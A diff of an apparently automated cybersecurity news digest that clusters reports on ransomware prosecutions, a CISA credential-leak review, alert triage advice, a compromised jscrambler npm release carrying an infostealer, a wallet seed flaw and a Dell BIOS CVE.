expands US lifting export control restrictions on Anthropic’s Mythos, Fable Supreme Court delivers ‘major win’ for tech privacy in Chatrie ruling What the post-quantum executive order really demands of CISOs Threats Interpol cybercrime crackdown nets 5,800 arrests across 97 countries Suspected Chinese espionage group used a Roundcube exploit chain to burrow into universities Alleged longstanding member of Scattered Spider extradited to US Researchers spot exploitation of another critical Oracle defect Policy Trump budget boss Russell Vought open to re-staffing CISA DHS to unveil replacement council for critical infrastructure cybersecurity Warner bill would create feder
+Advertisement Subscribe to our daily newsletter. Subscribe Close An Armenian national who was extradited from Ukraine to the United States last year pleaded guilty to participating in a series of attacks in 2019 and 2020 involving Ryuk ransomware, the Justice Department said Thursday. Karen Serobovich Vardanyan pleaded guilty to computer fraud and conspiracy to commit fraud and extortion. He agreed to pay nearly $1.2 million million in restitution and faces up to 15 years in jail. The 34-year-old admitted to participating in cybercrime from November 2019 to April 2020 when he and his co-conspirators deployed Ryuk ransomware against three U.S.-based organizations while living in Ukraine and Russia. Vardanyan’s victims include a Michigan-based company that paid a ransom of nearly $1.2 million in January 2020, a Watsonville, Oregon-based technology company that was attacked in December 2019 and a Texas-based school breached in February 2020. Advertisement Prosecutors previously accused Vardanyan and his co-conspirators — Ukrainian nationals Oleg Nikolayevich Lyulyava and Andrii Leonydovich Prykhodchenko, and Armenian national Levon Georgiyovych Avetisyan — of illegally accessing computer networks to deploy Ryuk ransomware on hundreds of compromised servers and workstations between March 2019 and September 2020. Ryuk ransomware was prevalent in 2019 and 2020, infecting thousands of victims globally across the private sector, state and local municipalities, local school districts and critical infrastructure, including a wave of attacks on U.S. hospitals. Victims of Ryuk ransomware attacks include Hollywood Presbyterian Medical Center , Universal Health Services , Electronic Warfare Associates , a North Carolina water utility and multiple U.S. newspapers. Ryuk ransomware operators extorted victim companies by demanding ransom payments in Bitcoin in exchange for decryption keys. Justice Department officials said Vardanyan and his co-conspirators received about 1,160 bitcoins — valued at more than $15 million at the time — in ransom payments from victim companies. Vardanyan, as part of his guilty plea, also acknowledged that his conviction will have immigration consequences resulting in removal from the United States after serving his sentence. Advertisement The U.S. District Court for the District of Oregon has yet to schedule his sentencing. Share Facebook LinkedIn Twitter Copy Link Advertisement Advertisement More Like This Advertisement Top Stories Advertisement More Scoops The Department of Justice building is seen in Washington, DC, on August 9, 2022. (Photo by Stefani Reynolds / AFP) (Photo by STEFANI REYNOLDS/AFP via Getty Images) Gwengoat, iStock/Getty Images Plus (Getty Images) Latest Podcasts When iPhone exploits turn into commodities What the post-quantum executive order means for CISOs How security investigators can get the right info out of AI security tools Inside Operation Disruption Week: Taking Down Southeast Asia’s Scam Machine Government CISA looks to remedy ailments from big May credential leak French nonprofit starts global intelligence and research hub for AI cyber threats US Army websites defaced with pro-Kurdish sentiments, insults to Trump Someone infected a spyware probe overseer with spyware Technology AI-generated code has made security debt a governance problem Deepfake CSAM lawsuit against xAI, Grok expands US lifting export control restrictions on Anthropic’s Mythos, Fable Supreme Court delivers ‘major win’ for tech privacy in Chatrie ruling Threats Interpol cybercrime crackdown nets 5,800 arrests across 97 countries Suspected Chinese espionage group used a Roundcube exploit chain to burrow into universities Alleged longstanding member of Scattered Spider extradited to US Researchers spot exploitation of another critical Oracle defect Policy Trump budget boss Russell Vought open to re-staffing CISA DHS to unveil replacement council for critical infrastructure cybersecurity Warner bill would create feder
 ```
 
 #### Corroborating sources (1)
@@ -3329,7 +3243,7 @@ A major credential leak spurred the Cybersecurity and Infrastructure Security Ag
 #### Full body
 
 ```
-Advertisement Subscribe to our daily newsletter. Subscribe Close A major credential leak spurred the Cybersecurity and Infrastructure Security Agency to strengthen protections for its sensitive materials, improve how researchers can report agency vulnerabilities and develop plans for similar incidents, the agency said in a forensic report released Thursday. The blog post outlines CISA’s response to the leak that the researcher who discovered it in May called one of the worst he had ever seen, which also drew congressional scrutiny . “Sharing experiences from incident response activities help other organizations learn from such experiences and enables them to take necessary precautions to prevent similar incidents from happening in their environments,” wrote Preston Werntz, acting chief information officer and Brad Libbey, acting chief information security officer. “For years, CISA has said this type of information exchange is critical to identifying trends and contributing to broader national awareness. Now, it is our turn.” On May 15, after learning about a contractor’s leak of privileged Amazon AWS GovCloud Keys on a public GitHub repository, CISA said it took steps to halt further harm. That meant taking the repository and its developer environment offline, and revoking the access of the person responsible for the leak. Advertisement CISA then analyzed the repository to get a sense of the scope of the leak. It also analyzed log files to learn that none of the leaked credentials were used outside of CISA, and that no customer or mission data was exposed. The response benefited from taking the reported incident seriously, having good logging capabilities and using zero-trust principles, the blog post states. But it also showed some things that needed to be fixed. CISA resolved to use its endpoint detection and response capabilities to monitor and manage uploads to public repositories. It rotated all of its secrets after the incident, and came up with a plan to improve management of its secrets. It determined that it would make it easy to report vulnerabilities related to CISA itself. It’s better at receiving information about vulnerabilities that are less agency-specific, given its role as a hub of communication about cyber risks for the United States and world generally, the post noted. Advertisement CISA also said it had to build a playbook for GitHub-related incidents mid-incident, and recognized the need to build playbooks for all kinds of incidents in advance. The person who uncovered the leak, GitGuardian security researcher Guillaume Valadon, applauded CISA’s evaluation of the incident. “I think that it is really good. CISA managed to explain what happened, what worked well and what needs to be improved,” he told CyberScoop via email. “This last part is, to me, the first time that a national cybersecurity agency is advocating for secrets scanning, and simplifying relations with researchers.” That’s something Valadon and his team have talked about for a while, and he said he was “proud to read that it is recognized by CISA.” Share Facebook LinkedIn Twitter Copy Link Advertisement Advertisement More Like This Advertisement Top Stories Advertisement More Scoops Citrix rated the overall bulletin severity as high and assigned CVSS scores ranging from 6.9 to 8.8 across the six CVEs. (Photo by Justin Sullivan/Getty Images) Nadezhda Buravleva, iStock/Getty Images Plus (Getty Images) Latest Podcasts When iPhone exploits turn into commodities What the post-quantum executive order means for CISOs How security investigators can get the right info out of AI security tools Inside Operation Disruption Week: Taking Down Southeast Asia’s Scam Machine Government US Army websites defaced with pro-Kurdish sentiments, insults to Trump Someone infected a spyware probe overseer with spyware US lifting export control restrictions on Anthropic’s Mythos, Fable Trump budget boss Russell Vought open to re-staffing CISA Technology Deepfake CSAM la
+Advertisement Subscribe to our daily newsletter. Subscribe Close A major credential leak spurred the Cybersecurity and Infrastructure Security Agency to strengthen protections for its sensitive materials, improve how researchers can report agency vulnerabilities and develop plans for similar incidents, the agency said in a forensic report released Thursday. The blog post outlines CISA’s response to the leak that the researcher who discovered it in May called one of the worst he had ever seen, which also drew congressional scrutiny . “Sharing experiences from incident response activities help other organizations learn from such experiences and enables them to take necessary precautions to prevent similar incidents from happening in their environments,” wrote Preston Werntz, acting chief information officer and Brad Libbey, acting chief information security officer. “For years, CISA has said this type of information exchange is critical to identifying trends and contributing to broader national awareness. Now, it is our turn.” On May 15, after learning about a contractor’s leak of privileged Amazon AWS GovCloud Keys on a public GitHub repository, CISA said it took steps to halt further harm. That meant taking the repository and its developer environment offline, and revoking the access of the person responsible for the leak. Advertisement CISA then analyzed the repository to get a sense of the scope of the leak. It also analyzed log files to learn that none of the leaked credentials were used outside of CISA, and that no customer or mission data was exposed. The response benefited from taking the reported incident seriously, having good logging capabilities and using zero-trust principles, the blog post states. But it also showed some things that needed to be fixed. CISA resolved to use its endpoint detection and response capabilities to monitor and manage uploads to public repositories. It rotated all of its secrets after the incident, and came up with a plan to improve management of its secrets. It determined that it would make it easy to report vulnerabilities related to CISA itself. It’s better at receiving information about vulnerabilities that are less agency-specific, given its role as a hub of communication about cyber risks for the United States and world generally, the post noted. Advertisement CISA also said it had to build a playbook for GitHub-related incidents mid-incident, and recognized the need to build playbooks for all kinds of incidents in advance. The person who uncovered the leak, GitGuardian security researcher Guillaume Valadon, applauded CISA’s evaluation of the incident. “I think that it is really good. CISA managed to explain what happened, what worked well and what needs to be improved,” he told CyberScoop via email. “This last part is, to me, the first time that a national cybersecurity agency is advocating for secrets scanning, and simplifying relations with researchers.” That’s something Valadon and his team have talked about for a while, and he said he was “proud to read that it is recognized by CISA.” Share Facebook LinkedIn Twitter Copy Link Advertisement Advertisement More Like This Advertisement Top Stories Advertisement More Scoops Citrix rated the overall bulletin severity as high and assigned CVSS scores ranging from 6.9 to 8.8 across the six CVEs. (Photo by Justin Sullivan/Getty Images) Nadezhda Buravleva, iStock/Getty Images Plus (Getty Images) Latest Podcasts When iPhone exploits turn into commodities What the post-quantum executive order means for CISOs How security investigators can get the right info out of AI security tools Inside Operation Disruption Week: Taking Down Southeast Asia’s Scam Machine Government French nonprofit starts global intelligence and research hub for AI cyber threats US Army websites defaced with pro-Kurdish sentiments, insults to Trump Someone infected a spyware probe overseer with spyware US lifting export control restrictions on Anthropic’s Mythos, Fable Tec
 ```
 
 #### Corroborating sources (1)
@@ -3396,8 +3310,8 @@ Vulnerabilities & Threats Cyber Risk Application Security Cybersecurity Operatio
 - Published: 2026-07-13T12:22:17+00:00
 - Link: https://www.helpnetsecurity.com/2026/07/13/ransomware-negotiator-blackcat-sentence/
 - Fetch status: ok
-- Member count: 3
-- Corroborating source count: 3
+- Member count: 2
+- Corroborating source count: 2
 - Strong signals: BlackCat/ALPHV
 
 #### Cluster taxonomy (union across members)
@@ -3426,18 +3340,13 @@ A former ransomware negotiator at incident response firm DigitalMint has been se
 Sinisa Markovic , Managing Editor, Help Net Security July 13, 2026 Share Ransomware negotiator who betrayed clients sentenced to 70 months in prison A former ransomware negotiator at incident response firm DigitalMint has been sentenced to 70 months in prison after admitting he shared confidential client information with the BlackCat ransomware group and later helped carry out ransomware attacks. Prosecutors say Angelo Martino, 41, abused his role at DigitalMint beginning in April 2023 by providing BlackCat operators with sensitive information gathered during ransomware negotiations . The information included victims’ negotiating positions, insurance policy limits, and internal assessments, helping the group maximize ransom demands against five organizations. “He was hired to help victims in a moment of crisis,” said U.S. Attorney Jason A. Reding Quiñones for the Southern District of Florida. “Instead, Martino betrayed them, fed their confidential negotiating positions to ransomware criminals, and helped squeeze them for more money.” Alongside Martino, Ryan Goldberg of Georgia and Kevin Martin of Texas were also involved in the scheme . All three worked in the cybersecurity industry and used their positions and expertise to support the criminal activity. Martino and Martin worked as ransomware negotiators at DigitalMint, while Goldberg was an incident response manager at Sygnia Cybersecurity Services. In one case, the conspirators received about $1.2 million in Bitcoin after a victim paid a ransom. The Justice Department said the money was divided among the participants and later laundered through cryptocurrency transactions designed to hide its origin. Federal investigators also seized more than $10 million in cryptocurrency and other assets linked to Martino. The forfeited property included luxury vehicles, a fishing boat, and a food truck. A restitution hearing will determine how much he must repay victims. Martino pleaded guilty on April 14 to a one-count information charging him with conspiring to interfere with interstate commerce through extortion. On May 1, his co-conspirators, Kevin Martin and Ryan Goldberg, were each sentenced to 48 months in prison for their roles in the conspiracy. In late 2023, law enforcement disrupted the BlackCat/ALPHV ransomware group by seizing control of its data leak site. More about cybercrime law enforcement ransomware US DoJ USA Share
 ```
 
-#### Corroborating sources (3)
+#### Corroborating sources (2)
 
 - **Help Net Security** (cyber_news_breach_reporting)
   - Title: Ransomware negotiator who betrayed clients sentenced to 70 months in prison
   - Published: 2026-07-13T12:22:17+00:00
   - Link: https://www.helpnetsecurity.com/2026/07/13/ransomware-negotiator-blackcat-sentence/
   - Summary: A former ransomware negotiator at incident response firm DigitalMint has been sentenced to 70 months in prison after admitting he shared confidential client information with the BlackCat ransomware group and later helped carry out ransomware attacks. Prosecutors say Angelo Martino, 41, abused his role at DigitalMint beginning in April 2023 by providing BlackCat operators with sensitive information gathered during ransomware negotiations. The information included victims’ negotiating positions, insurance policy limits, and internal assessments, helping the … More → The post Ransomware negotiator who betrayed clients sentenced to 70 months in prison appeared first on Help Net Security .
-- **The Record** (cyber_news_breach_reporting)
-  - Title: Ryuk operator pleads guilty; Blackcat/AlphV conspirator gets nearly 6-year sentence
-  - Published: 2026-07-10T17:01:00+00:00
-  - Link: https://therecord.media/ryuk-operator-pleads-guilty-alphv-conspirator-sentenced
-  - Summary: One man accused of deploying Ryuk ransomware pleaded guilty Wednesday in an Oregon federal court to conspiracy and computer fraud, while another man received a 70-month federal prison sentence in a Florida court for helping the Blackcat/AlphV gang extort multiple victims.
 - **The Hacker News** (cyber_news_breach_reporting)
   - Title: Ransomware Negotiator Gets 70 Months in Prison for Aiding BlackCat Attacks
   - Published: 2026-07-10T08:10:12+00:00
@@ -3450,7 +3359,7 @@ Sinisa Markovic , Managing Editor, Help Net Security July 13, 2026 Share Ransomw
 - Source: Black Hills Information Security (detection_response_operations)
 - Published: 2026-07-08T14:00:00+00:00
 - Link: https://www.blackhillsinfosec.com/the-goldilocks-zone/
-- Fetch status: not_attempted
+- Fetch status: ok
 - Member count: 1
 - Corroborating source count: 1
 - Strong signals: (none)
@@ -3469,6 +3378,12 @@ Sinisa Markovic , Managing Editor, Help Net Security July 13, 2026 Share Ransomw
 We're all petrified about missing a critical event or misclassifying an alert, but when we're talking about incident response (IR), there are often hundreds if not thousands of alerts to parse through. It's easy to get caught up with one alert because it feels "too hot" or maybe not spend enough time looking into something that initially seems "too cold." The post Finding the “Goldilocks” Zone: A Practical Approach to Alert Triage appeared first on Black Hills Information Security, Inc. .
 ```
 
+#### Full body
+
+```
+8 Jul 2026 Active SOC , Blue Team , DFIR , Hayden Covington , Incident Response , Informational Alert Traige , Detection Logic , Infosec for Beginners , InfoSec Survival Guide , Orange Book , SIEM Finding the “Goldilocks” Zone: A Practical Approach to Alert Triage | Hayden Covington This article was originally published in the InfoSec Survival Guide: Orange Book — Incident Response. Read it free online HERE , or grab it on the Spearphish General Store (free digital download or a $1.25 physical copy, your call). Security engineers, analysts, and incident responders all have one thing in common, and I’m not talking about 3 AM phone calls concerning incidents. I’m talking about triage: that challenging moment of urgency when assessments must be made and classifications communicated—for the right things to be decided on to prevent the bad stuff from happening. We’re all petrified about missing a critical event or misclassifying an alert, but when we’re talking about incident response (IR), there are often hundreds if not thousands of alerts to parse through. It’s easy to get caught up with one alert because it feels “too hot” or maybe not spend enough time looking into something that initially seems “too cold.” I’ll provide some tips, tricks, and techniques to help find that “Goldilocks Zone” of spending just the right amount of time on an alert, allowing you to quickly triage and move on to the next. Consider the Severities The simplest way to triage events is to consider the severity of the alert. Initially, most Low-severity alerts should be entirely ignored. On any given case, time is limited, and the value return of going over hundreds of Low alerts is not even remotely comparable to that of reviewing higher priority findings. Mediums will often be the bulk of your alert volume, with these being right in that uncomfortable middle of the “Probably nothing” of Lows and the “Definitely something” of Highs or Criticals. To move quickly on an IR engagement, I categorically relegate the Medium alerts to a later time on that case; and almost every time, the High and Critical alerts tell the real story, giving concrete direction on how to search the Mediums and Lows in a more targeted fashion. Anomalies Against the Baseline One of the most surefire ways to quickly classify an event as a true or false positive is to compare the activity against the normal baseline: “Does this happen regularly on this host,” “in this environment,” or maybe even “in any of the environments I can observe?” While a certain execution or activity on one host may appear anomalous, once you discover that it happens on a number of hosts across multiple environments, either you’ve just found your answer, or you’ve discovered a much bigger issue… Actions on Objective One of my favorite tactics is considering “actions on objective.” If an attacker gains access to a host, they have an end goal in mind. Whether that goal is financially motivated, a desire to steal data, or even if they just want to observe activity in the environment—they broke in for a purpose. Someone isn’t going to go through the effort of breaking into your house just to stand around. For the attacker to achieve their goals, some form of activity must occur to get them there. That often looks like exfiltration or lateral movement. All that to say, if the activity you’re looking at never actually goes anywhere, steals anything, or tries to override anything else, chances are it may not actually be evil, because it certainly isn’t doing the attacker much good. Detection Intent Probably the most novel (and somewhat controversial) approach I’ve come across is considering detection intent first and foremost. This approach requires you to understand exactly what it is that the rule that fired is looking for, and to look for that one specific thing only, ignoring anything else you may see in the periphery. That idea may sound counterintuitive but think about it: Threat detections are often straightfor
+```
+
 #### Corroborating sources (1)
 
 - **Black Hills Information Security** (detection_response_operations)
@@ -3483,20 +3398,22 @@ We're all petrified about missing a critical event or misclassifying an alert, b
 - Source: The Hacker News (cyber_news_breach_reporting)
 - Published: 2026-07-11T17:59:26+00:00
 - Link: https://thehackernews.com/2026/07/compromised-jscrambler-8140-npm-release.html
-- Fetch status: not_attempted
+- Fetch status: ok
 - Member count: 2
 - Corroborating source count: 2
 - Strong signals: npm
 
 #### Cluster taxonomy (union across members)
-- threat_categories: credential_theft, web_shell_backdoor
-- affected_products: npm
+- threat_categories: credential_theft, supply_chain, web_shell_backdoor
+- affected_industries: financial_services
+- affected_products: Apple iOS/macOS, npm
 - content_type: incident_report, news_report
 - confidence_tier: tier_4_news
 
 #### Primary article taxonomy
-- threat_categories: credential_theft
-- affected_products: npm
+- threat_categories: supply_chain, credential_theft
+- affected_industries: financial_services
+- affected_products: npm, Apple iOS/macOS
 - content_type: incident_report
 - confidence_tier: tier_4_news
 
@@ -3504,6 +3421,12 @@ We're all petrified about missing a critical event or misclassifying an alert, b
 
 ```
 The jscrambler npm package was compromised, and simply installing its 8.14.0 release runs an infostealer on your machine. Published on July 11, 2026, the malicious version carries a preinstall hook that drops and executes a native binary, one build each for Windows, macOS, and Linux. Socket flagged the release six minutes after it was published. If you or one of your
+```
+
+#### Full body
+
+```
+Compromised jscrambler 8.14.0 npm Release Drops Rust Infostealer During Install  Swati Khandelwal  Jul 11, 2026 Software Supply Chain / Malware The jscrambler npm package was compromised, and simply installing its 8.14.0 release runs an infostealer on your machine. Published on July 11, 2026, the malicious version carries a preinstall hook that drops and executes a native binary, one build each for Windows, macOS, and Linux. Socket flagged the release six minutes after it was published . If you or one of your build systems pulled it in that window, the payload has already run with whatever access your install process had. None of this is in the prior release, 8.13.0. The package diff shows two new files under dist/: setup.js, a small loader, and intro.js. Despite the name, intro.js is not JavaScript but a roughly 7.8MB container packing three gzip-compressed native binaries, one each for Linux, Windows, and macOS. On install, setup.js picks the binary for the host operating system, writes it under a random name in the system temp directory, marks it executable, and launches it detached with its output hidden. The added files are in the published package, but nowhere in jscrambler's public source. StepSecurity and SafeDep both pulled and analyzed the release, and both report no matching commit, tag, or pull request for 8.14.0 in the GitHub repository. Its latest tag is still 8.13.0. The version was pushed straight to npm under a legitimate maintainer account, bypassing the project's normal release flow. That points to a compromised npm account or build pipeline. Which of the two has not been established. The payload is a Rust infostealer, built for all three platforms, that sweeps a developer machine for secrets and ships them to a drop server over TLS, according to Socket's updated analysis and a statement to The Hacker News. The target list is broad and aimed at developers: cloud credentials from AWS, Azure, and Google Cloud, including the metadata endpoints CI runners use; cryptocurrency wallets and seed phrases from MetaMask, Phantom, and Exodus; the Bitwarden password manager vault; browser-stored passwords and cookies; and Discord, Slack, Telegram, and Steam sessions. It also goes after something newer: the config files for AI coding tools, including Claude Desktop, Cursor, Windsurf, VS Code, and Zed, where API keys and Model Context Protocol server credentials tend to sit. The binaries do more than steal. On Linux, the payload links the kernel's BPF library and can load an eBPF program straight into the kernel from memory. That is a foothold in the kernel, not the userspace file access that the rest of the stealer relies on. StepSecurity and SafeDep both flagged the capability, though what the eBPF does is still being pulled apart. The Windows and macOS builds add anti-debugging checks, and the stealer wires in persistence to survive a reboot: a hidden Windows scheduled task set to relaunch every minute, and a macOS LaunchAgent that reloads on login. Its command-and-control details stay encrypted in the binary and never surfaced in static analysis. StepSecurity's runtime monitoring caught the dropped binary reaching out to two hard-coded IP addresses and to Tor infrastructure, the first network indicators published for the campaign. jscrambler is a build-time tool, installed as a development dependency or run from CI. Those environments hold what the stealer collects: cloud keys, deploy tokens, and source code that a build or CI process can reach. Source: Step Security The package sees about 15,800 downloads a week, and how many pulled the compromised version is not yet known. That is a far smaller footprint than the packages hit in the big npm compromises of the past year, which pull billions of downloads a week between them. For a stealer aimed at build machines, though, reach was never the point. The access is. The Shai-Hulud worm ran from an install hook to steal tokens and spread through hundreds of packages that
 ```
 
 #### Corroborating sources (2)
@@ -3553,3 +3476,38 @@ Security firm Coinspect has disclosed a crypto wallet flaw it calls Ill Bloom, a
   - Published: 2026-07-10T09:00:05+00:00
   - Link: https://thehackernews.com/2026/07/attackers-exploit-ill-bloom.html
   - Summary: Security firm Coinspect has disclosed a crypto wallet flaw it calls Ill Bloom, and attackers are already using it. The flaw is in how some wallet software generated its recovery phrase, the words that control the money. When that phrase is made with weak randomness, an attacker can work it out and take everything it controls. The firm has confirmed one coordinated sweep on May 27
+
+### Cluster 6a5a22a81b — score 8
+
+- Title: Dell BIOS Passwords: Weak XOR Encryption Allows Recovery from SPI Flash (CVE-2026-40639)
+- Source: Reddit r/netsec (reddit_practitioner_osint)
+- Published: 2026-07-13T09:33:49+00:00
+- Link: https://www.reddit.com/r/netsec/comments/1uv6qbn/dell_bios_passwords_weak_xor_encryption_allows/
+- Fetch status: not_attempted
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: CVE-2026-40639
+
+#### Cluster taxonomy (union across members)
+- cve_ids: CVE-2026-40639
+- content_type: vulnerability_disclosure
+- confidence_tier: tier_5_chatter
+
+#### Primary article taxonomy
+- cve_ids: CVE-2026-40639
+- content_type: vulnerability_disclosure
+- confidence_tier: tier_5_chatter
+
+#### Summary
+
+```
+submitted by /u/sajkoterrapefft [link] [comments]
+```
+
+#### Corroborating sources (1)
+
+- **Reddit r/netsec** (reddit_practitioner_osint)
+  - Title: Dell BIOS Passwords: Weak XOR Encryption Allows Recovery from SPI Flash (CVE-2026-40639)
+  - Published: 2026-07-13T09:33:49+00:00
+  - Link: https://www.reddit.com/r/netsec/comments/1uv6qbn/dell_bios_passwords_weak_xor_encryption_allows/
+  - Summary: submitted by /u/sajkoterrapefft [link] [comments]
